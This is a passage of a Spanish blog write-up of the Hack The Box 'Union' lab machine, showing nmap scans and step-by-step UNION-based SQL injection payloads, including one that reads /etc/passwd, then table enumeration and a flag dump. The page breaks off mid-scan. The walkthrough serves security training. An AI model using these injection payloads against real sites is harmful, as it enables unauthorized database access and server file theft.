<!DOCTYPE html>













<html lang="es-ES"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Union Writeup" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="10.10.11.128 Union (medium machine)" />
<meta property="og:description" content="10.10.11.128 Union (medium machine)" />
<link rel="canonical" href="http://localhost:4000/posts/Union/" />
<meta property="og:url" content="http://localhost:4000/posts/Union/" />
<meta property="og:site_name" content="Droix3d Blog" />
<meta property="og:image" content="http://localhost:4000/Union.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-31T00:00:00-06:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/Union.png" />
<meta property="twitter:title" content="Union Writeup" />
<meta name="twitter:site" content="@OmarDroixed" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-31T00:00:00-06:00","datePublished":"2023-01-31T00:00:00-06:00","description":"10.10.11.128 Union (medium machine)","headline":"Union Writeup","image":"http://localhost:4000/Union.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Union/"},"url":"http://localhost:4000/posts/Union/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Union Writeup | Droix3d | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Droix3d | Blog">
<meta name="application-name" content="Droix3d | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="https://64.media.tumblr.com/a600c17b1b667791e235c61010b66f15/2a2abc5ee8557d93-0e/s540x810/b4c9bf289319c94abbd5a256a36fbfea693ff727.pnj" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">Droix3d | Blog</a>
    </div>
    <div class="site-subtitle font-italic">Pentesting / Ciberseguridad  / Hacking</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGOR√çAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/Droix3d" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/OmarDroixed" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>Union Writeup</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>Union Writeup</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1675144800"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-01-31
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
          <a href="https://twitter.com/OmarDroixed">Omar Vlz Aka(Droix3d)</a>
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2082 palabras">
  <em>11 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>10.10.11.128 Union (medium machine)</strong></p>

<h2 id="information-ghatering--scanports"><span class="mr-2">Information Ghatering / ScanPorts</span><a href="#information-ghatering--scanports" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>Comenzamos con la fase de recolecci√≥n de informaci√≥n haciendo un escaneo por TCP en todos los puertos con nmap</li>
</ul>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p-</span>  <span class="nt">-sS</span> <span class="nt">-vvv</span>  <span class="nt">--min-rate</span> 2000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.128 <span class="nt">-oG</span> allPorts 
<span class="go">
</span></pre></td></tr></tbody></table></code></div></div>
<p>-p-  -&gt; escanearemos todos los rangos de puertos (65535)</p>

<p>-sS -&gt; an√°lisis utilizando TCP SYN Este tipo de escaneo, est√° basado en la velocidad de escaneo, de ah√≠ la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall, no termina la conexi√≥n TCP/SYN - Envias un SYN - Recibes un SYN/ACK - Envias ResetPacket</p>

<p>-vvv -&gt; verbose para que mediante vayas descubriendo puertos se reporten en la terminal</p>

<p>‚Äìmin-rate 2000 -&gt; paquetes enviados no mas lentos que 2000 paquetes por segundo, env√≠o de paquetes super r√°pido</p>

<p>-n -&gt; que no aplique resoluci+on de DNS para que no tarde el escaneo</p>

<p>-Pn -&gt; ni que me detecte el descburimiento de hosts</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.128 <span class="nt">-oG</span> allPorts
<span class="go">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 17:04 CST
Initiating SYN Stealth Scan at 17:04
Scanning 10.10.11.128 [65535 ports]
Discovered open port 80/tcp on 10.10.11.128
Completed SYN Stealth Scan at 17:05, 26.49s elapsed (65535 total ports)
Nmap scan report for 10.10.11.128
Host is up, received user-set (0.093s latency).
Scanned at 2023-01-31 17:04:36 CST for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds
           Raw packets sent: 131088 (5.768MB) | Rcvd: 20 (880B)

</span></pre></td></tr></tbody></table></code></div></div>

<p>Observamos que solo tenemos el puerto 80 expuesto y si hacemos un barrido de puertos y servicio tampoco recibimos suficiente informaci√≥n, eso me hace pensar que la explotaci√≥n ser√° a trav√©s de la web solamente</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="go">nmap -sCV -p80 10.10.11.128 -oN targeted                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 17:05 CST
Nmap scan report for 10.10.11.128
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
</span><span class="gp">|_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span><span class="nb">.</span>
<span class="go">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds

</span></pre></td></tr></tbody></table></code></div></div>
<p>-sCV -&gt; escaneo lanzando scripts que detecten servicios y versiones</p>

<p>-p -&gt; especeficando los puertos a escanear</p>

<p>-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted</p>

<p>vemos un sitio web un poco extra√±o donde pide ingresar un usuario, dicho sitio es una especie de registro en un torneo. eso me hace pensar que ya hay algunos registros por detras contemplados asi que puede ser vulnerable la base de datos por inyecci√≥n.</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/web.png" alt="" data-proofer-ignore></p>

<p>el sitio comtempla php intentando varios tipos de command injection no tengo resultados ya que mi input lo registra y me pide una especie de flag</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/web1.png" alt="" data-proofer-ignore></p>

<p>para completar el registro me pide una flag, para visualizar esto mejor y tener comodidad al leer el output de la web interceptar√© por Burpsuite la petici√≥n, por lo tanto al tramitar mi data por POST tratar√© de hacer la tipica inyecci√≥n SQL para ver que tipo de resultado me arroja</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp.png" alt="" data-proofer-ignore></p>

<p>y vemos que nos menciona un usuario llamado ippsec que ya esta registrado en el sistema, por lo tanto la explotaci√≥n puede ser por SQLI</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp1.png" alt="" data-proofer-ignore></p>

<h2 id="post-explotaci√≥n"><span class="mr-2">Post Explotaci√≥n</span><a href="#post-explotaci√≥n" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>en este punto har√© varias tipos de inyecciones gu√≠andome de alguna error based para enumerar columnas</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="go">player=admin'order by 10-- -
player=admin'order by 5-- -
player=admin'order by 1-- -
</span></pre></td></tr></tbody></table></code></div></div>
<p>pero no tenemos √©xito, me sigue reportando que se ha registrado el usuario, por lo tanto intentare directamente aplicar una uni√≥n comenzando desde la primera columna seguido de otras mas un tipo fuzzing</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="go">player=admin'union select 1,2,3-- -
player=admin'union select 1,2-- -
</span></pre></td></tr></tbody></table></code></div></div>
<p>hasta este punto me sigue reportando el usuario registrado pero pasa algo si solo enumero una columna</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp2.png" alt="" data-proofer-ignore></p>

<p>por lo tanto en esa sentencia de valor de 1 es donde aplicar√© las querys, comenzando con un <strong>version()</strong> para enumerar la versi√≥n de la base de datos en uso</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp3.png" alt="" data-proofer-ignore></p>

<p>la query puede ser directa por lo tanto intentare enumerar primero el nombre de la base de datos en uso ,si puedo cargar archivos internos del servidor y algun usuario con el que este relacionado con la db</p>

<p><strong>consulta para saber el nombre de la base de datos en uso</strong></p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>mi input
<span class="go">player=admin'union select database()-- -

</span><span class="gp">&gt;</span>output 
<span class="go">Sorry, november you are not eligible due to already qualifying.
</span></pre></td></tr></tbody></table></code></div></div>
<p><strong>consulta para apuntar a archivos internos del servidor</strong></p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="gp">$</span>mi input
<span class="go">player=admin'union select load_file("/etc/passwd")-- -

</span><span class="gp">&gt;</span><span class="w"> </span>output 
<span class="go">Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
you are not eligible due to already qualifying.
</span></pre></td></tr></tbody></table></code></div></div>
<p><strong>consulta para ver usuario</strong></p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="gp">$</span>mi input
<span class="go">player=admin'union select user()-- -

</span><span class="gp">&gt;</span>output 
<span class="go">Sorry, uhc@localhost you are not eligible due to already qualifying.
</span></pre></td></tr></tbody></table></code></div></div>
<h2 id="explotaci√≥n"><span class="mr-2">Explotaci√≥n</span><a href="#explotaci√≥n" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<ul>
  <li>En este punto ya tenemos varias cosas interesantes
    <ol>
      <li>Nombre de usuario</li>
      <li>Nombre de la base de datos</li>
      <li>Lectura de archivos internos del servidor</li>
    </ol>
  </li>
</ul>

<p>por lo tanto comenzar√© con las inyecciones sql sobre la db en uso que es <strong>november</strong></p>

<p><strong>Primera inyecci√≥n para saber las tablas existentes de la db ‚Äúnovember‚Äù</strong>
<img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp4.png" alt="" data-proofer-ignore>
Muy bien veo una que la tabla se llama flag <strong>Posteriormente har√© otra inyecci√≥n para saber las columnas de la tabla flag</strong></p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp5.png" alt="" data-proofer-ignore>
y veo una columna que se llama one <strong>Har√© una ultima inyecci√≥n para dumpear el contenido que se almacena en la tabla flag en la columna one</strong></p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/burp6.png" alt="" data-proofer-ignore>
anexando un group_concat por si veo mas data seguido de pero ese no es el caso, simplmente hay el valor que parece ser la flag de un usuario y ese usuario quiero pensar que es uhc@localhost, comprobar√© en el sitio web si con ese usuario y esa flag me sale alguna otra cosa</p>

<p><img data-src="/assets/img/commons/Union//assets/img/commons/Union/web2.png" alt="" data-proofer-ignore>
y enhorabuena :D en complete challengue colocando la flag me permite tener acceso por ssh ya que mi ip la registra, haciendo otro escaneo con nmap vemos el puerto 22 expuesto , que ese puerto no estaba abierto la primera vez que hicimos el escaneo</p>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¬°Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>map <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-sCV</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.128                           
<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 22:30 CST
</span><span class="gp">Stats: 0:00:01 elapsed;</span><span class="w"> </span>0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
<span class="go">SYN Stealth Scan Timing: About 0.68% done
